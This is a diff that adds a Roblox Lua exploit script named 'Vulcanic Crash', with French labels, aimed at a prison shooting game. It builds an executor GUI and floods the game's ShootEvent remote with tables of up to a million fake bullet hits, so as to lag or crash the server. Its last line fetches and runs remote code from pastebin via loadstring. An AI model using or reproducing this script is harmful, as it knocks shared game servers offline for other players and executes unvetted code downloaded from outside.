@@ -1,0 +1,283 @@
+local AltF4_PL = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local title = Instance.new("TextLabel")
+local small = Instance.new("TextButton")
+local bigger = Instance.new("TextButton")
+local evenbigger = Instance.new("TextButton")
+local kill = Instance.new("TextButton")
+local num = Instance.new("TextBox")
+local custom = Instance.new("TextButton")
+local status = Instance.new("TextLabel")
+local credits = Instance.new("TextBox")
+local network = Instance.new("TextLabel")
+
+AltF4_PL.Name = "Vulcanic Crash"
+AltF4_PL.Parent = game:GetService("CoreGui")
+AltF4_PL.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+main.Name = "main"
+main.Parent = AltF4_PL
+main.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
+main.BorderColor3 = Color3.fromRGB(255, 128, 0)
+main.BorderSizePixel = 1
+main.BorderColor3 = Color3.fromRGB(255, 128, 0)
+main.Position = UDim2.new(0.100000001, 0, 0.150000006, 0)
+main.Size = UDim2.new(0, 340, 0, 160)
+
+title.Name = "title"
+title.Parent = main
+title.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
+title.BorderColor3 = Color3.fromRGB(255, 128, 0)
+title.BorderSizePixel = 1
+title.Size = UDim2.new(0, 340, 0, 30)
+title.Font = Enum.Font.SciFi
+title.Text = "Vulcanic Crash"
+title.TextColor3 = Color3.fromRGB(255, 128, 0)
+title.TextScaled = true
+title.TextSize = 14.000
+title.TextWrapped = true
+title.TextXAlignment = Enum.TextXAlignment.Right
+
+small.Name = "small"
+small.Parent = main
+small.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
+small.BorderColor3 = Color3.fromRGB(255, 128, 1)
+small.BorderSizePixel = 1
+small.Position = UDim2.new(0, 5, 0, 36)
+small.Size = UDim2.new(0, 165, 0, 30)
+small.ZIndex = 0
+small.Font = Enum.Font.SourceSans
+small.Text = "Petit Lag"
+small.TextColor3 = Color3.fromRGB(255, 128, 0)
+small.TextSize = 15.000
+
+bigger.Name = "Petit Lag"
+bigger.Parent = main
+bigger.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bigger.BorderColor3 = Color3.fromRGB(255, 128, 0)
+bigger.BorderSizePixel = 1
+bigger.Position = UDim2.new(0, 170, 0, 36)
+bigger.Size = UDim2.new(0, 165, 0, 30)
+bigger.ZIndex = 0
+bigger.Font = Enum.Font.SourceSans
+bigger.Text = "Lag"
+bigger.TextColor3 = Color3.fromRGB(255, 128, 0)
+bigger.TextSize = 15.000
+
+evenbigger.Name = "Gros lag"
+evenbigger.Parent = main
+evenbigger.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
+evenbigger.BorderColor3 = Color3.fromRGB(255, 128, 0)
+evenbigger.BorderSizePixel = 1
+evenbigger.Position = UDim2.new(0, 5, 0, 66)
+evenbigger.Size = UDim2.new(0, 165, 0, 30)
+evenbigger.ZIndex = 0
+evenbigger.Font = Enum.Font.SourceSans
+evenbigger.Text = "Très gros lag"
+evenbigger.TextColor3 = Color3.fromRGB(255, 128, 0)
+evenbigger.TextSize = 15.000
+
+kill.Name = "kill"
+kill.Parent = main
+kill.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
+kill.BorderColor3 = Color3.fromRGB(255, 128, 0)
+kill.BorderSizePixel = 1
+kill.Position = UDim2.new(0, 170, 0, 66)
+kill.Size = UDim2.new(0, 165, 0, 30)
+kill.ZIndex = 0
+kill.Font = Enum.Font.SourceSans
+kill.Text = "Niquer le serveur"
+kill.TextColor3 = Color3.fromRGB(255, 128, 0)
+kill.TextSize = 15.000
+
+num.Name = "num"
+num.Parent = main
+num.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
+num.BorderColor3 = Color3.fromRGB(255, 128, 0)
+num.BorderSizePixel = 1
+num.Position = UDim2.new(0, 7, 0, 110)
+num.Size = UDim2.new(0, 161, 0, 30)
+num.Font = Enum.Font.SourceSans
+num.PlaceholderText = "le nombre de balles"
+num.Text = ""
+num.TextColor3 = Color3.fromRGB(255, 128, 0)
+num.TextSize = 14.000
+
+custom.Name = "custom"
+custom.Parent = main
+custom.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
+custom.BorderSizePixel = 1
+custom.BorderColor3 = Color3.fromRGB(255, 128, 0)
+custom.Position = UDim2.new(0, 172, 0, 110)
+custom.Size = UDim2.new(0, 161, 0, 30)
+custom.Font = Enum.Font.SourceSans
+custom.Text = "tire ces balles"
+custom.TextColor3 = Color3.fromRGB(255, 128, 0)
+custom.TextSize = 20.000
+
+status.Name = "status"
+status.Parent = main
+status.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+status.BorderSizePixel = 0
+status.Position = UDim2.new(0, 0, 0, 145)
+status.Size = UDim2.new(0, 240, 0, 15)
+status.Font = Enum.Font.SourceSans
+status.Text = "Status bar"
+status.TextColor3 = Color3.fromRGB(255, 128, 0)
+status.TextSize = 16.000
+
+credits.Name = "credits"
+credits.Parent = main
+credits.BackgroundColor3 = Color3.fromRGB(255, 128, 0)
+credits.BackgroundTransparency = 1.000
+credits.Position = UDim2.new(0, 0, 0, 2)
+credits.Size = UDim2.new(0, 200, 0, 10)
+credits.Font = Enum.Font.SourceSans
+credits.Text = "TheEliteFrom78"
+credits.TextColor3 = Color3.fromRGB(95, 95, 95)
+credits.TextSize = 14.000
+credits.ClearTextOnFocus = false
+
+network.Name = "network"
+network.Parent = main
+network.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+network.BorderSizePixel = 0
+network.Position = UDim2.new(0, 240, 0, 145)
+network.Size = UDim2.new(0, 100, 0, 15)
+network.Font = Enum.Font.SourceSans
+network.Text = "Network KB/s"
+network.TextColor3 = Color3.fromRGB(255, 128, 0)
+network.TextSize = 16.000
+
+function set(txt)status.Text=(txt)wait()end
+local Z=Vector3.new()
+local main={Hit=nil;Distance=0;Cframe=CFrame.new(Z,Z)*CFrame.new(0,0,0);RayObject=Ray.new(Z,Z);}
+smallTable,biggerTable,EvenBiggerTable,KillTable = {},{},{},{};
+for i=1,100 do
+	for i=1,10 do table.insert(smallTable,main)end
+	if i/math.floor(i/10)/10 == 1 then
+		set("Status 0% <> "..tostring(i).."%")
+	end
+end 
+for i=1,100 do
+	for i=1,100 do table.insert(biggerTable,main)end
+	if i/math.floor(i/10)/10 == 1 then
+		set("Status 25% <> "..tostring(i).."%")
+	end
+end
+for i=1,100 do
+	for i=1,1000 do table.insert(EvenBiggerTable,main)end
+	if i/math.floor(i/10)/10 == 1 then
+		set("Status 50% <> "..tostring(i).."%")
+	end
+end
+for i=1,100 do
+	for i=1,10000 do table.insert(KillTable,main)end
+	if i/math.floor(i/10)/10 == 1 then
+		set("Status 75% <> "..tostring(i).."%")
+	end
+end
+local remote = game:GetService("ReplicatedStorage").ShootEvent
+local plr = game:GetService("Players").LocalPlayer
+function getGun()
+	local gun = plr.Backpack:FindFirstChild("M9") or plr.Character:FindFirstChild("M9")
+	if gun then
+		return gun
+	else
+		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
+		local gun = plr.Backpack:FindFirstChild("M9")
+		return gun
+	end
+end
+small.MouseButton1Click:Connect(function()
+	local gun = getGun()
+	if gun then wait(.5)
+		remote:FireServer(smallTable,gun)
+		set("Fired "..#smallTable)
+	else
+		set("Can't proceed, no M9")
+	end
+end)
+bigger.MouseButton1Click:Connect(function()
+	local gun = getGun()
+	if gun then wait(.5)
+		remote:FireServer(biggerTable,gun)
+		set("Fired "..#biggerTable)
+	else
+		set("Can't proceed, no M9")
+	end
+end)
+evenbigger.MouseButton1Click:Connect(function()
+	local gun = getGun()
+	if gun then wait(.5)
+		remote:FireServer(EvenBiggerTable,gun)
+		set("Fired "..#EvenBiggerTable)
+	else
+		set("Can't proceed, no M9")
+	end
+end)
+kill.MouseButton1Click:Connect(function()
+	local gun = getGun()
+	if gun then wait(.5)
+		remote:FireServer(KillTable,gun)
+		set("Fired "..#KillTable)
+	else
+		set("Can't proceed, no M9")
+	end
+end)
+num:GetPropertyChangedSignal("Text"):Connect(function()
+	if not tonumber(num.Text)then
+		local x = "";
+		for i,v in pairs(string.split(num.Text,""))do
+			if tonumber(v)then
+				x = x..tostring(v)
+			end
+		end
+		num.Text = x
+	end
+end)
+local customTable = {}
+function getT(amount)amount = math.floor(amount)
+	if amount == #customTable then return end
+	customTable = {}
+	if amount <= 1000 then
+		set("Creating table")
+		for i=1,amount do
+			table.insert(customTable,main)
+		end
+	else
+		local x = math.floor(amount/100)
+		for i=1,100 do
+			local remainder = amount - x
+			for i=1,x do table.insert(customTable,main)end
+			if i/math.floor(i/10)/10 == 1 then
+				set("Status Custom% <> "..tostring(i).."%")
+			end
+		end
+		for i=1,amount-x do
+			table.insert(customTable,main)
+		end
+	end
+end
+custom.MouseButton1Click:Connect(function()
+	local num = num.Text
+	if tonumber(num) then
+		getT(num)
+		local gun = getGun()
+		if gun then
+			remote:FireServer(customTable,gun)
+			set("Fired "..#customTable)
+		else
+			set("Can't proceed, no M9")
+		end
+	end
+end)
+local stats = game:GetService("Stats")
+local step = game:GetService("RunService").RenderStepped
+local digits = 10
+step:Connect(function()
+	network.Text = tostring(math.floor(stats.DataSendKbps*digits)/digits).."KB/s"
+end)
+set("Status 100% Loaded")
+
+loadstring(game:HttpGet("https://pastebin.com/raw/PiJXMBr6"))()(AltF4_PL.main)--drag
